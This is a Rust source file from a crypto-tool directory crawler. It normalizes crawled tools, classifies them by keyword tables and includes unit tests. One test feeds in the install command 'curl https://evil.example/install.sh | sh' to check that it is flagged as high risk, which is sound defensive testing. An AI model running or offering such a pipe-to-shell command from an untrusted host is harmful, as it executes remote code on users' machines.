//! Normalizer — source data → [`Tool`] normalization + 3-axis classification.
// Goal harness deliverable AC3
// harness-round-7: 2026-06-25T19:10:00Z-normalizer
//!
//! See `docs/MVP_DESIGN.md` section 3 for keyword rules. The three
//! classification functions (`classify_function`, `classify_asset_class`,
//! `classify_actor`) implement the exact keyword tables from the design doc.
//! All matching is case-insensitive.

use serde::{Deserialize, Serialize};

use crate::crawler::relevance::{assess_relevance, RelevanceInput};
use crate::install_safety::assess_install;
use crate::models::Tool;

/// Raw tool as produced by a source crawler, before normalization.
///
/// Each source crawler (cryptoskill, github, npm, web3-mcp) populates a
/// vector of `RawTool`s. The normalizer then applies 3-axis classification
/// and slug generation to produce a [`Tool`] ready for DB upsert.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RawTool {
    pub name: String,
    pub description: Option<String>,
    /// Source-supplied type (`mcp` | `cli` | `sdk` | `api` | `skill` | `x402`).
    pub tool_type: String,
    pub repo_url: Option<String>,
    pub homepage: Option<String>,
    pub npm_package: Option<String>,
    pub install_command: Option<String>,
    pub mcp_endpoint: Option<String>,
    pub chains: Vec<String>,
    pub stars: i32,
    pub last_commit_at: Option<chrono::DateTime<chrono::Utc>>,
    /// Source identifier (`cryptoskill` | `web3-mcp-hub` | `github` | `npm`).
    pub source: String,
    pub source_url: Option<String>,
    pub license: Option<String>,
}

/// Check whether `text` contains `keyword` as a whole-word match.
///
/// Single-word keywords (no spaces, dots, or hyphens) are matched against
/// the alphanumeric tokens of `text` so that short keywords like `"dex"` do
/// not falsely match inside `"indexer"`. Multi-word or compound keywords
/// (containing spaces, dots, or hyphens — e.g. `"bob gateway"`,
/// `"tiny.place"`, `"cross-chain"`) fall back to substring matching because
/// their embedded delimiters already act as natural word boundaries.
fn matches_keyword(text: &str, keyword: &str) -> bool {
    if keyword.contains(' ') || keyword.contains('.') || keyword.contains('-') {
        text.contains(keyword)
    } else {
        text.split(|c: char| !c.is_alphanumeric())
            .any(|w| w == keyword)
    }
}

/// Keyword rules for the `function` axis, in priority order.
///
/// The first rule whose keyword appears in the (lowercased) text wins. The
/// order matches `docs/MVP_DESIGN.md` section 3 exactly.
const FUNCTION_RULES: &[(&str, &[&str])] = &[
    (
        "bridge",
        &[
            "bridge",
            "cross-chain",
            "gateway",
            "bob gateway",
            "wormhole",
            "layerzero",
        ],
    ),
    (
        "swap",
        &[
            "swap",
            "dex",
            "uniswap",
            "jupiter",
            "1inch",
            "liquidity pool",
        ],
    ),
    (
        "wallet",
        &["wallet", "custody", "key", "sign", "mpc", "safe"],
    ),
    (
        "payments",
        &[
            "payment", "x402", "usdc", "invoice", "checkout", "onramp", "offramp",
        ],
    ),
    (
        "lending",
        &[
            "lending",
            "borrow",
            "loan",
            "aave",
            "compound",
            "liquidation",
        ],
    ),
    (
        "staking",
        &[
            "staking",
            "stake",
            "yield",
            "restake",
            "eigenlayer",
            "marinade",
        ],
    ),
    (
        "trading",
        &[
            "trade",
            "trading",
            "perp",
            "perpetual",
            "futures",
            "options",
            "hyperliquid",
            "gmx",
            "dydx",
        ],
    ),
    (
        "nft",
        &["nft", "mint", "opensea", "collection", "magic eden"],
    ),
    (
        "data",
        &[
            "analytics",
            "price",
            "market data",
            "coingecko",
            "defillama",
            "indexer",
            "oracle",
            "subgraph",
        ],
    ),
    (
        "dev-tool",
        &[
            "rpc", "sdk", "hardhat", "foundry", "compiler", "debug", "remix",
        ],
    ),
    (
        "identity",
        &[
            "identity",
            "ens",
            "attestation",
            "worldcoin",
            "kya",
            "world id",
        ],
    ),
    (
        "governance",
        &[
            "governance",
            "dao",
            "vote",
            "proposal",
            "treasury",
            "snapshot",
        ],
    ),
    (
        "social",
        &[
            "social",
            "lens",
            "farcaster",
            "content",
            "creator",
            "mirror",
        ],
    ),
    (
        "ai-agent",
        &[
            "agent",
            "autonomous",
            "ai agent",
            "eliza",
            "virtuals",
            "ai16z",
            "defai",
            "tiny.place",
        ],
    ),
];

/// Classify the `function` axis from text. Default: `dev-tool`.
///
/// Iterates rules in declared order; first keyword match wins. Matching is
/// case-insensitive substring matching.
pub fn classify_function(text: &str) -> &'static str {
    let lower = text.to_lowercase();
    for (cat, keywords) in FUNCTION_RULES {
        if keywords.iter().any(|k| matches_keyword(&lower, k)) {
            return cat;
        }
    }
    "dev-tool"
}

/// Classify the `asset_class` axis. Default: `crypto`.
///
/// Order: `rwa` → `derivatives` → `stablecoins` → `crypto` (default).
pub fn classify_asset_class(text: &str) -> &'static str {
    let lower = text.to_lowercase();
    if [
        "rwa",
        "real world asset",
        "treasury",
        "t-bill",
        "stock token",
        "ondo",
        "securitize",
    ]
    .iter()
    .any(|k| matches_keyword(&lower, k))
    {
        "rwa"
    } else if [
        "derivative",
        "perpetual",
        "perp",
        "option",
        "futures",
        "synthetic",
    ]
    .iter()
    .any(|k| matches_keyword(&lower, k))
    {
        "derivatives"
    } else if ["stablecoin", "usdc", "usdt", "dai", "stable"]
        .iter()
        .any(|k| matches_keyword(&lower, k))
    {
        "stablecoins"
    } else {
        "crypto"
    }
}

/// Classify the `actor` axis. Default: `human`.
pub fn classify_actor(text: &str) -> &'static str {
    let lower = text.to_lowercase();
    if [
        "agent",
        "autonomous",
        "ai agent",
        "agentic",
        "bot",
        "eliza",
        "tiny.place",
    ]
    .iter()
    .any(|k| matches_keyword(&lower, k))
    {
        "ai-agent"
    } else {
        "human"
    }
}

/// GitHub username/org segment (alphanumeric + hyphen, 1–39 chars).
pub fn is_valid_github_owner(owner: &str) -> bool {
    if owner.is_empty() || owner.len() > 39 {
        return false;
    }
    if owner.starts_with('-') || owner.ends_with('-') {
        return false;
    }
    owner.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
}

/// Infer a remote logo URL from repo/homepage metadata.
pub fn infer_logo_url(repo_url: Option<&str>, homepage: Option<&str>) -> Option<String> {
    crate::models::tool::github_owner_avatar_url(repo_url)
        .or_else(|| crate::models::tool::homepage_favicon_url(homepage))
}

/// Generate a base slug from a tool name (kebab-case, trimmed).
///
/// Uses the `slug` crate which handles Unicode + punctuation stripping. The
/// result is lowercased ASCII with hyphens. Empty/whitespace names fall back
/// to `tool` so we never produce an empty slug.
#[allow(dead_code)]
pub fn base_slug(name: &str) -> String {
    let s = slug::slugify(name);
    if s.is_empty() {
        "tool".to_string()
    } else {
        s
    }
}

/// Generate a unique slug given an existing set of taken slugs.
///
/// If the base slug is already taken, append `-2`, `-3`, ... until a free
/// slug is found. This satisfies VAL-CRAWL-011 ("foo-bar" + "foo-bar" →
/// "foo-bar" and "foo-bar-2").
#[allow(dead_code)]
pub fn unique_slug(name: &str, taken: &std::collections::HashSet<String>) -> String {
    let base = base_slug(name);
    if !taken.contains(&base) {
        return base;
    }
    let mut n = 2u32;
    loop {
        let candidate = format!("{base}-{n}");
        if !taken.contains(&candidate) {
            return candidate;
        }
        n += 1;
    }
}

/// Normalize a single [`RawTool`] into a [`Tool`].
///
/// Applies 3-axis classification by combining the tool name and description
/// as the classification text corpus. Generates a unique slug against the
/// supplied `taken` set (which is **not** mutated here — callers should add
/// the returned slug to the set before normalizing the next tool).
/// `initial_approval_status` is typically `"approved"` or `"pending"` from
/// [`crate::crawler::settings::initial_approval_status`].
#[allow(dead_code)]
pub fn normalize(
    raw: &RawTool,
    taken: &std::collections::HashSet<String>,
    initial_approval_status: &str,
) -> Tool {
    let corpus = match &raw.description {
        Some(d) => format!("{} {}", raw.name, d),
        None => raw.name.clone(),
    };

    let function = classify_function(&corpus);
    let asset_class = classify_asset_class(&corpus);
    let actor = classify_actor(&corpus);
    let slug = unique_slug(&raw.name, taken);

    let now = chrono::Utc::now();
    let mut review = crate::models::tool::default_review_fields();

    let relevance = assess_relevance(&RelevanceInput {
        name: &raw.name,
        description: raw.description.as_deref(),
        tool_type: &raw.tool_type,
        repo_url: raw.repo_url.as_deref(),
        homepage: raw.homepage.as_deref(),
        npm_package: raw.npm_package.as_deref(),
        mcp_endpoint: raw.mcp_endpoint.as_deref(),
        chains: &raw.chains,
        source: &raw.source,
    });
    review.crypto_relevance_score = relevance.score;
    review.crypto_relevance_reasons = relevance.reasons;
    review.relevance_status = relevance.status;

    let install_safety = assess_install(raw.install_command.as_deref(), raw.npm_package.as_deref());
    review.install_risk_level = install_safety.risk_level;
    review.install_risk_reasons = install_safety.reasons;
    review.requires_secret = install_safety.requires_secret;
    review.safe_copy_command = install_safety.safe_copy_command;

    Tool {
        id: uuid::Uuid::new_v4(),
        name: raw.name.clone(),
        slug,
        description: raw.description.clone(),
        function: function.to_string(),
        asset_class: asset_class.to_string(),
        actor: actor.to_string(),
        tool_type: raw.tool_type.clone(),
        repo_url: raw.repo_url.clone(),
        homepage: raw.homepage.clone(),
        npm_package: raw.npm_package.clone(),
        install_command: raw.install_command.clone(),
        mcp_endpoint: raw.mcp_endpoint.clone(),
        chains: raw.chains.clone(),
        // Crawled tools start as `community`; admin can promote to
        // `verified`/`official`. `self_register` overrides this to `official`.
        status: "community".to_string(),
        official_team: None,
        trust_score: 0,
        approval_status: initial_approval_status.to_string(),
        submitted_by: None,
        rejection_reason: None,
        crypto_relevance_score: review.crypto_relevance_score,
        crypto_relevance_reasons: review.crypto_relevance_reasons,
        relevance_status: review.relevance_status,
        install_risk_level: review.install_risk_level,
        install_risk_reasons: review.install_risk_reasons,
        requires_secret: review.requires_secret,
        safe_copy_command: review.safe_copy_command,
        quarantined_at: review.quarantined_at,
        last_reviewed_at: review.last_reviewed_at,
        review_policy_version: review.review_policy_version,
        claim_state: "unclaimed".to_string(),
        license: raw.license.clone(),
        pricing: "free".to_string(),
        x402_price: None,
        referral_enabled: false,
        referral_bps: None,
        referral_payout_address: None,
        referral_model: None,
        x402_pay_to_address: None,
        x402_builder_code: None,
        payment_verified: false,
        x402_endpoint_verified: false,
        price_verified: false,
        x402_endpoint: None,
        x402_last_checked_at: None,
        x402_check_failures: 0,
        stars: raw.stars,
        last_commit_at: raw.last_commit_at,
        source: raw.source.clone(),
        source_url: raw.source_url.clone(),
        logo_url: infer_logo_url(raw.repo_url.as_deref(), raw.homepage.as_deref()),
        logo_monogram: None,
        created_at: now,
        updated_at: now,
    }
}

/// Normalize a batch of [`RawTool`]s, ensuring unique slugs within the batch.
///
/// Slugs are tracked across the batch so two tools with the same name get
/// distinct slugs (`foo-bar`, `foo-bar-2`). Returned in the same order as
/// input.
#[allow(dead_code)]
pub fn normalize_batch_with_status(raws: &[RawTool], initial_approval_status: &str) -> Vec<Tool> {
    let mut taken: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out = Vec::with_capacity(raws.len());
    for raw in raws {
        let tool = normalize(raw, &taken, initial_approval_status);
        taken.insert(tool.slug.clone());
        out.push(tool);
    }
    out
}

/// Normalize a batch with `approval_status = "approved"` (backward-compatible default).
#[allow(dead_code)]
pub fn normalize_batch(raws: &[RawTool]) -> Vec<Tool> {
    normalize_batch_with_status(raws, "approved")
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---------------------------------------------------------------------------
    // classify_function — parameterized tests for all 14 categories + default.
    // ---------------------------------------------------------------------------

    #[test]
    fn classify_function_bridge() {
        assert_eq!(
            classify_function("BOB Gateway — Bitcoin to EVM bridge"),
            "bridge"
        );
        assert_eq!(classify_function("wormhole cross-chain protocol"), "bridge");
        assert_eq!(classify_function("layerzero endpoint"), "bridge");
    }

    #[test]
    fn classify_function_swap() {
        assert_eq!(classify_function("uniswap v4 dex router"), "swap");
        assert_eq!(classify_function("jupiter swap aggregator"), "swap");
        assert_eq!(classify_function("1inch liquidity pool"), "swap");
    }

    #[test]
    fn classify_function_wallet() {
        assert_eq!(
            classify_function("walletconnect custody MPC safe"),
            "wallet"
        );
        assert_eq!(classify_function("sign key management"), "wallet");
    }

    #[test]
    fn classify_function_payments() {
        assert_eq!(classify_function("x402 usdc payment checkout"), "payments");
        assert_eq!(classify_function("onramp offramp invoice"), "payments");
    }

    #[test]
    fn classify_function_lending() {
        assert_eq!(classify_function("aave lending borrow loan"), "lending");
        assert_eq!(
            classify_function("compound liquidation protocol"),
            "lending"
        );
    }

    #[test]
    fn classify_function_staking() {
        assert_eq!(classify_function("eigenlayer restake yield"), "staking");
        assert_eq!(classify_function("marinade stake solana"), "staking");
    }

    #[test]
    fn classify_function_trading() {
        assert_eq!(
            classify_function("hyperliquid perp perpetual futures"),
            "trading"
        );
        assert_eq!(classify_function("gmx dydx options trading"), "trading");
    }

    #[test]
    fn classify_function_nft() {
        assert_eq!(classify_function("opensea nft marketplace mint"), "nft");
        assert_eq!(classify_function("magic eden collection"), "nft");
    }

    #[test]
    fn classify_function_data() {
        assert_eq!(classify_function("coingecko price analytics"), "data");
        assert_eq!(
            classify_function("defillama subgraph indexer oracle"),
            "data"
        );
        assert_eq!(classify_function("market data feed"), "data");
    }

    #[test]
    fn classify_function_dev_tool() {
        assert_eq!(classify_function("hardhat foundry rpc sdk"), "dev-tool");
        assert_eq!(classify_function("compiler debug remix"), "dev-tool");
    }

    #[test]
    fn classify_function_identity() {
        assert_eq!(
            classify_function("ens identity attestation worldcoin"),
            "identity"
        );
        assert_eq!(classify_function("world id kya verification"), "identity");
    }

    #[test]
    fn classify_function_governance() {
        assert_eq!(
            classify_function("snapshot dao vote proposal"),
            "governance"
        );
        assert_eq!(
            classify_function("treasury governance protocol"),
            "governance"
        );
    }

    #[test]
    fn classify_function_social() {
        assert_eq!(classify_function("lens farcaster social content"), "social");
        assert_eq!(classify_function("mirror creator economy"), "social");
    }

    #[test]
    fn classify_function_ai_agent() {
        assert_eq!(classify_function("eliza autonomous ai agent"), "ai-agent");
        assert_eq!(
            classify_function("virtuals ai16z defai tiny.place"),
            "ai-agent"
        );
    }

    #[test]
    fn classify_function_default_dev_tool() {
        // No keyword match → default `dev-tool`.
        assert_eq!(
            classify_function("random project with no keywords"),
            "dev-tool"
        );
        assert_eq!(classify_function(""), "dev-tool");
    }

    #[test]
    fn classify_function_case_insensitive() {
        assert_eq!(classify_function("BRIDGE Gateway"), "bridge");
        assert_eq!(classify_function("UNISWAP Swap"), "swap");
        assert_eq!(classify_function("AGENT Autonomous"), "ai-agent");
    }

    #[test]
    fn classify_function_priority_order() {
        // `bridge` rule comes before `dev-tool`; even if `sdk` appears later,
        // the first match wins.
        assert_eq!(classify_function("bridge sdk"), "bridge");
        // `data` rule comes before `ai-agent`; `analytics` matches `data`
        // before `agent` can match `ai-agent`.
        assert_eq!(classify_function("agent analytics"), "data");
    }

    // ---------------------------------------------------------------------------
    // classify_asset_class
    // ---------------------------------------------------------------------------

    #[test]
    fn classify_asset_class_rwa() {
        assert_eq!(classify_asset_class("rwa real world asset token"), "rwa");
        assert_eq!(
            classify_asset_class("ondo treasury t-bill stock token securitize"),
            "rwa"
        );
    }

    #[test]
    fn classify_asset_class_derivatives() {
        assert_eq!(
            classify_asset_class("perpetual perp futures option synthetic derivative"),
            "derivatives"
        );
    }

    #[test]
    fn classify_asset_class_stablecoins() {
        assert_eq!(
            classify_asset_class("usdc usdt dai stablecoin stable"),
            "stablecoins"
        );
    }

    #[test]
    fn classify_asset_class_crypto_default() {
        assert_eq!(classify_asset_class("bitcoin ethereum defi"), "crypto");
        assert_eq!(classify_asset_class(""), "crypto");
    }

    #[test]
    fn classify_asset_class_case_insensitive() {
        assert_eq!(classify_asset_class("RWA Treasury"), "rwa");
        assert_eq!(classify_asset_class("USDC STABLE"), "stablecoins");
    }

    #[test]
    fn classify_asset_class_priority() {
        // `rwa` checked before `derivatives`/`stablecoins`/`crypto`.
        assert_eq!(classify_asset_class("rwa perp usdc"), "rwa");
        // `derivatives` before `stablecoins`.
        assert_eq!(classify_asset_class("perp usdc"), "derivatives");
        // `stablecoins` before `crypto`.
        assert_eq!(classify_asset_class("usdc bitcoin"), "stablecoins");
    }

    // ---------------------------------------------------------------------------
    // classify_actor
    // ---------------------------------------------------------------------------

    #[test]
    fn classify_actor_ai_agent() {
        assert_eq!(
            classify_actor("autonomous ai agent agentic bot"),
            "ai-agent"
        );
        assert_eq!(classify_actor("eliza framework tiny.place"), "ai-agent");
    }

    #[test]
    fn classify_actor_human_default() {
        assert_eq!(classify_actor("a regular defi tool"), "human");
        assert_eq!(classify_actor(""), "human");
    }

    #[test]
    fn classify_actor_case_insensitive() {
        assert_eq!(classify_actor("AGENT AUTONOMOUS"), "ai-agent");
        assert_eq!(classify_actor("BoT framework"), "ai-agent");
    }

    // ---------------------------------------------------------------------------
    // slug generation
    // ---------------------------------------------------------------------------

    #[test]
    fn base_slug_basic() {
        assert_eq!(base_slug("BOB Gateway CLI"), "bob-gateway-cli");
        assert_eq!(base_slug("Uniswap V4"), "uniswap-v4");
    }

    #[test]
    fn base_slug_empty_falls_back() {
        assert_eq!(base_slug(""), "tool");
        assert_eq!(base_slug("!!!"), "tool");
    }

    #[test]
    fn unique_slug_no_collision() {
        let taken = std::collections::HashSet::new();
        assert_eq!(unique_slug("Foo Bar", &taken), "foo-bar");
    }

    #[test]
    fn unique_slug_first_collision_appends_2() {
        let mut taken = std::collections::HashSet::new();
        taken.insert("foo-bar".to_string());
        assert_eq!(unique_slug("Foo Bar", &taken), "foo-bar-2");
    }

    #[test]
    fn unique_slug_multiple_collisions() {
        let mut taken = std::collections::HashSet::new();
        taken.insert("foo-bar".to_string());
        taken.insert("foo-bar-2".to_string());
        taken.insert("foo-bar-3".to_string());
        assert_eq!(unique_slug("Foo Bar", &taken), "foo-bar-4");
    }

    #[test]
    fn unique_slug_batch_distinct() {
        let raws = vec![
            RawTool {
                name: "Foo Bar".into(),
                description: None,
                tool_type: "mcp".into(),
                repo_url: None,
                homepage: None,
                npm_package: None,
                install_command: None,
                mcp_endpoint: None,
                chains: vec![],
                stars: 0,
                last_commit_at: None,
                source: "manual".into(),
                source_url: None,
                license: None,
            },
            RawTool {
                name: "Foo Bar".into(),
                description: None,
                tool_type: "cli".into(),
                repo_url: None,
                homepage: None,
                npm_package: None,
                install_command: None,
                mcp_endpoint: None,
                chains: vec![],
                stars: 0,
                last_commit_at: None,
                source: "manual".into(),
                source_url: None,
                license: None,
            },
        ];
        let tools = normalize_batch(&raws);
        assert_eq!(tools.len(), 2);
        assert_eq!(tools[0].slug, "foo-bar");
        assert_eq!(tools[1].slug, "foo-bar-2");
        assert_ne!(tools[0].slug, tools[1].slug);
    }

    // ---------------------------------------------------------------------------
    // normalize
    // ---------------------------------------------------------------------------

    fn sample_raw() -> RawTool {
        RawTool {
            name: "BOB Gateway CLI".into(),
            description: Some("Bitcoin to EVM bridge CLI with AI agent docs".into()),
            tool_type: "cli".into(),
            repo_url: Some("https://github.com/bob-collective/bob".into()),
            homepage: Some("https://gobob.xyz".into()),
            npm_package: Some("@gobob/gateway-cli".into()),
            install_command: Some("npx @gobob/gateway-cli".into()),
            mcp_endpoint: None,
            chains: vec!["bitcoin".into(), "ethereum".into(), "base".into()],
            stars: 125,
            last_commit_at: None,
            source: "github".into(),
            source_url: Some("https://github.com/bob-collective/bob".into()),
            license: Some("MIT".into()),
        }
    }

    #[test]
    fn infer_logo_url_from_github_repo() {
        assert_eq!(
            infer_logo_url(Some("https://github.com/bob-collective/bob"), None),
            Some("https://avatars.githubusercontent.com/bob-collective".into())
        );
        assert_eq!(
            infer_logo_url(Some("https://github.com/bob-collective/bob.git"), None),
            Some("https://avatars.githubusercontent.com/bob-collective".into())
        );
        assert_eq!(
            infer_logo_url(Some("http://github.com/org/repo"), None),
            Some("https://avatars.githubusercontent.com/org".into())
        );
        assert_eq!(
            infer_logo_url(None, Some("https://gobob.xyz")),
            Some("https://gobob.xyz/favicon.ico".into())
        );
        assert_eq!(
            infer_logo_url(Some("https://gitlab.com/foo/bar"), None),
            None
        );
        assert_eq!(
            infer_logo_url(Some("https://github.com/acme%2Fsecret/repo"), None),
            None
        );
    }

    #[test]
    fn is_valid_github_owner_rejects_malformed_segments() {
        assert!(is_valid_github_owner("bob-collective"));
        assert!(!is_valid_github_owner(""));
        assert!(!is_valid_github_owner("-bad"));
        assert!(!is_valid_github_owner("bad-"));
        assert!(!is_valid_github_owner("acme/repo"));
    }

    #[test]
    fn normalize_produces_classified_tool() {
        let taken = std::collections::HashSet::new();
        let tool = normalize(&sample_raw(), &taken, "approved");
        assert_eq!(tool.name, "BOB Gateway CLI");
        assert_eq!(tool.slug, "bob-gateway-cli");
        assert!(!tool.slug.is_empty());
        assert_eq!(tool.tool_type, "cli");
        // "bridge" rule matches "bridge" keyword.
        assert_eq!(tool.function, "bridge");
        // "agent" → ai-agent.
        assert_eq!(tool.actor, "ai-agent");
        // No rwa/derivatives/stablecoin keywords → crypto.
        assert_eq!(tool.asset_class, "crypto");
        assert_eq!(tool.status, "community");
        assert_eq!(tool.approval_status, "approved");
        assert_eq!(tool.pricing, "free");
        assert_eq!(tool.stars, 125);
        assert_eq!(tool.source, "github");
        assert_eq!(tool.chains, vec!["bitcoin", "ethereum", "base"]);
        assert_eq!(tool.license.as_deref(), Some("MIT"));
        assert_eq!(
            tool.logo_url.as_deref(),
            Some("https://avatars.githubusercontent.com/bob-collective")
        );
    }

    #[test]
    fn normalize_uses_name_when_no_description() {
        let mut raw = sample_raw();
        raw.description = None;
        raw.name = "eliza agent".into();
        let taken = std::collections::HashSet::new();
        let tool = normalize(&raw, &taken, "approved");
        assert_eq!(tool.function, "ai-agent");
        assert_eq!(tool.actor, "ai-agent");
    }

    #[test]
    fn normalize_respects_pending_initial_approval_status() {
        let taken = std::collections::HashSet::new();
        let tool = normalize(&sample_raw(), &taken, "pending");
        assert_eq!(tool.approval_status, "pending");
    }

    #[test]
    fn normalize_batch_with_status_pending() {
        let raws = vec![sample_raw()];
        let tools = normalize_batch_with_status(&raws, "pending");
        assert_eq!(tools[0].approval_status, "pending");
    }

    #[test]
    fn normalize_populates_relevance_and_install_safety() {
        let taken = std::collections::HashSet::new();
        let tool = normalize(&sample_raw(), &taken, "pending");
        assert_eq!(tool.relevance_status, "accepted");
        assert!(tool.crypto_relevance_score >= 70);
        assert!(!tool.crypto_relevance_reasons.is_empty());
        assert_eq!(tool.install_risk_level, "low");
        assert!(tool.safe_copy_command.is_some());
    }

    #[test]
    fn normalize_rejects_filesystem_mcp() {
        let raw = RawTool {
            name: "Filesystem MCP".into(),
            description: Some("MCP server for local file operations".into()),
            tool_type: "mcp".into(),
            repo_url: None,
            homepage: None,
            npm_package: None,
            install_command: None,
            mcp_endpoint: None,
            chains: vec![],
            stars: 0,
            last_commit_at: None,
            source: "npm".into(),
            source_url: None,
            license: None,
        };
        let taken = std::collections::HashSet::new();
        let tool = normalize(&raw, &taken, "pending");
        assert_eq!(tool.relevance_status, "rejected");
    }

    #[test]
    fn normalize_flags_high_risk_install() {
        let mut raw = sample_raw();
        raw.install_command = Some("curl https://evil.example/install.sh | sh".into());
        let taken = std::collections::HashSet::new();
        let tool = normalize(&raw, &taken, "pending");
        assert_eq!(tool.install_risk_level, "high");
        assert!(tool.safe_copy_command.is_none());
    }

    #[test]
    fn normalize_batch_preserves_order_and_unique_slugs() {
        let raws = vec![
            RawTool {
                name: "Alpha".into(),
                description: Some("swap dex".into()),
                tool_type: "mcp".into(),
                repo_url: None,
                homepage: None,
                npm_package: None,
                install_command: None,
                mcp_endpoint: None,
                chains: vec![],
                stars: 0,
                last_commit_at: None,
                source: "npm".into(),
                source_url: None,
                license: None,
            },
            RawTool {
                name: "Beta Staking".into(),
                description: None,
                tool_type: "sdk".into(),
                repo_url: None,
                homepage: None,
                npm_package: None,
                install_command: None,
                mcp_endpoint: None,
                chains: vec![],
                stars: 5,
                last_commit_at: None,
                source: "npm".into(),
                source_url: None,
                license: None,
            },
        ];
        let tools = normalize_batch(&raws);
        assert_eq!(tools.len(), 2);
        assert_eq!(tools[0].name, "Alpha");
        assert_eq!(tools[0].function, "swap");
        assert_eq!(tools[1].name, "Beta Staking");
        assert_eq!(tools[1].slug, "beta-staking");
        assert_eq!(tools[1].function, "staking");
    }
}
